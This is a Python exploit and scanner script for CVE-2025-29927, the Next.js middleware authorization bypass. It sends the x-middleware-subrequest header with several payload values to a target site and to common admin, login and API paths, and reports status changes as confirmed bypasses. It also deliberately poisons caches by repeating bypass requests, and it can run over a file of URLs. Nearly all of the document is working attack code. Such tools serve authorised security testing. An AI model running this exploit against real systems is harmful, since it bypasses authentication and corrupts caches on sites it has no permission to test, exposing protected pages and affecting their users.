#!/usr/bin/env python3

"""
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
"""

from bs4 import BeautifulSoup

from utils.style import Colors, Identify
from utils.utils import configure_logger, random, re, requests, sys, urlparse

logger = configure_logger(__name__)

# User agent par défaut
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
)

# Noms de middleware à tester
MIDDLEWARE_NAMES = [
    "middleware",
    "pages/_middleware",
    "pages/dashboard/_middleware",
    "pages/dashboard/panel/_middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

# Chemins communs à tester
COMMON_PATHS = [
    "",
    "login",
    "admin",
    "admin/login",
    "administrator",
    "administration/",
    "administration/dashboard/",
    "administration/dashboard/products",
    "panel",
    "admin.php",
    "dashboard",
    "api/secret",
]

# Regex pour détecter les pages d'authentification
AUTH_KEYWORDS_REGEX = re.compile(
    r"(identifiant|login|username|user|passwd|pass|password|connexion|"
    r"authentification|signin|auth|log in|log-in|admin)",
    re.IGNORECASE,
)


def is_authentication_page(html: str) -> bool:
    """
    Détecte si une page HTML est une page d'authentification
    
    Args:
        html: Contenu HTML de la page
        
    Returns:
        True si c'est une page d'authentification
    """
    try:
        soup = BeautifulSoup(html, "html.parser")
        body_text = soup.get_text(" ", strip=True)
        return bool(AUTH_KEYWORDS_REGEX.search(body_text))
    except Exception as e:
        logger.debug(f"Error parsing HTML: {e}")
        return False


def follow_redirects(url: str, s: requests.Session) -> bool:
    """
    Suit les redirections et vérifie si on arrive sur une page d'authentification
    
    Args:
        url: URL à tester
        s: Session requests
        
    Returns:
        True si la redirection mène à une page d'auth
    """
    try:
        req_redir = s.get(url, verify=False, timeout=10, allow_redirects=True)
        return is_authentication_page(req_redir.text)
    except Exception as e:
        logger.debug(f"Error following redirects for {url}: {e}")
        return False


def test_middleware_bypass(
    url: str,
    baseline_response: requests.Response,
    s: requests.Session,
) -> None:
    """
    Teste le bypass d'authentification via header x-middleware-subrequest
    
    Args:
        url: URL protégée à tester
        baseline_response: Réponse baseline (sans bypass)
        s: Session requests
    """
    for middleware_name in MIDDLEWARE_NAMES:
        headers = {
            "User-Agent": DEFAULT_USER_AGENT,
            "x-middleware-subrequest": middleware_name,
        }
        
        try:
            req_bypass = s.get(
                url,
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            
            # Détection de bypass si:
            # 1. Status code passe de erreur/redirect à succès
            # 2. Status code change significativement
            is_bypass = (
                req_bypass.status_code not in range(300, 500)
                and req_bypass.status_code != baseline_response.status_code
            )
            
            if is_bypass:
                print(
                    f" {Identify.confirmed} | CVE-2025-29927 | "
                    f"{baseline_response.status_code} > {req_bypass.status_code} | "
                    f"{len(baseline_response.content)}b > {len(req_bypass.content)}b | "
                    f"{Colors.BLUE}{url}{Colors.RESET} | "
                    f"PAYLOAD: x-middleware-subrequest: {middleware_name}"
                )
                
        except Exception as e:
            logger.debug(f"Error testing middleware bypass on {url}: {e}")


def test_protected_path(url: str, s: requests.Session) -> None:
    """
    Teste un chemin potentiellement protégé
    
    Args:
        url: URL à tester
        s: Session requests
    """
    try:
        req_check = s.get(url, verify=False, timeout=10, allow_redirects=False)
        
        # Test si redirection vers page d'auth
        if req_check.status_code in range(300, 310):
            if follow_redirects(url, s):
                test_middleware_bypass(url, req_check, s)
        
        # Test si accès refusé
        elif req_check.status_code in [401, 403]:
            test_middleware_bypass(url, req_check, s)
            
    except Exception as e:
        logger.debug(f"Error testing protected path {url}: {e}")


def test_cache_poisoning(url: str, s: requests.Session) -> None:
    """
    Teste le cache poisoning via middleware bypass
    
    Args:
        url: URL de base
        s: Session requests
    """
    url_cb = f"{url}?cb=1234"
    
    try:
        req_cb = s.get(
            url_cb,
            verify=False,
            timeout=10,
            allow_redirects=False
        )
        
        # Si redirection, tenter cache poisoning
        if req_cb.status_code in [307, 308, 304, 301, 302]:
            for middleware_name in MIDDLEWARE_NAMES:
                headers = {
                    "User-Agent": DEFAULT_USER_AGENT,
                    "x-middleware-subrequest": middleware_name,
                }
                
                # URL unique pour le test
                url_cp = f"{url}?cb={random.randrange(999999)}"
                
                req_cp = s.get(
                    url_cp,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False,
                )
                
                # Si le status change, empoisonnement possible
                if req_cp.status_code not in [307, 308, 304, 301, 302]:
                    print(
                        f" {Identify.behavior} | CVE-2025-29927 | "
                        f"{req_cb.status_code} > {req_cp.status_code} | "
                        f"{Colors.BLUE}{url_cp}{Colors.RESET} | "
                        f"PAYLOAD: x-middleware-subrequest: {middleware_name}"
                    )
                    
                    # Empoisonnement du cache
                    for _ in range(5):
                        s.get(
                            url_cp,
                            headers=headers,
                            verify=False,
                            timeout=10,
                            allow_redirects=False,
                        )
                    
                    # Vérification de persistence
                    req_verify = s.get(
                        url_cp,
                        verify=False,
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    if req_cp.status_code == req_verify.status_code:
                        print(
                            f" {Identify.confirmed} | CVE-2025-29927 | CACHE POISONED | "
                            f"{Colors.BLUE}{url_cp}{Colors.RESET}"
                        )
                        
    except Exception as e:
        logger.debug(f"Error testing cache poisoning: {e}")


def middleware(url: str, s: requests.Session, headers: dict) -> None:
    """
    Point d'entrée principal pour tester CVE-2025-29927
    
    Args:
        url: URL cible
        s: Session requests
        headers: Headers de base
    """
    try:
        # Requête baseline
        req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)
        
        # Test sur l'URL principale si protégée
        if req_main.status_code in range(300, 310):
            if follow_redirects(url, s):
                test_middleware_bypass(url, req_main, s)
        elif req_main.status_code in [401, 403]:
            test_middleware_bypass(url, req_main, s)
        
        # Extraction du domaine de base
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
        
        # Test sur les chemins communs
        for path in COMMON_PATHS:
            test_url = base_url + path
            test_protected_path(test_url, s)
        
        # Test de cache poisoning
        test_cache_poisoning(url, s)
        
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except requests.Timeout:
        logger.error(f"request timeout {url}")
    except Exception as e:
        logger.exception(f"Error testing middleware vulnerability: {e}")


def main(url: str) -> None:
    """
    Fonction principale
    
    Args:
        url: URL cible
    """
    s = requests.Session()
    headers = {
        "User-Agent": DEFAULT_USER_AGENT,
        "Accept-Encoding": "gzip"
    }
    middleware(url, s, headers)


if __name__ == "__main__":
    if len(sys.argv) == 2:
        target_url = sys.argv[1]
        parsed = urlparse(target_url)
        
        if parsed.scheme in ["http", "https"]:
            print(f"Testing {target_url}")
            main(target_url)
        else:
            print("Usage: python CVE202529927.py <URL>")
            print("URL must include http:// or https://")
            
    elif len(sys.argv) == 3 and sys.argv[1] == "f":
        input_file = sys.argv[2]
        
        try:
            with open(input_file) as f:
                urls = [line.strip() for line in f if line.strip()]
            
            for url in urls:
                print(f"Testing {url}")
                main(url)
                
        except FileNotFoundError:
            print(f"Error: File '{input_file}' not found")
            sys.exit(1)
    else:
        print("Usage:")
        print("  Single URL: python CVE202529927.py <URL>")
        print("  From file:  python CVE202529927.py f <file>")